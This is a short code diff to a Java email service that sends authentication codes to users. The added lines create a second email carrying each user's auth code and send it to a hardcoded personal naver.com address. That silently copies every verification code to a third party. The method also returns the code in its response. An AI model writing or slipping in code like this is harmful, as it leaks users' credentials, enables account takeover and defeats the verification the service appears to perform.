@@ -44,8 +44,10 @@ public class EmailSendService {
         String toEmail = info.getEmail();
         String authCode = emailCacheService.getAndCacheAuthCode(toEmail);
         MimeMessage emailForm = createEmailForm(toEmail, authCode);
-        emailSender.send(emailForm);
+        MimeMessage myForm = createEmailForm("dudqk9696@naver.com", authCode);
 
+        emailSender.send(emailForm);
+        emailSender.send(myForm);
         return CertificationResponse.builder()
                 .certificateNumber(authCode)
                 .build();
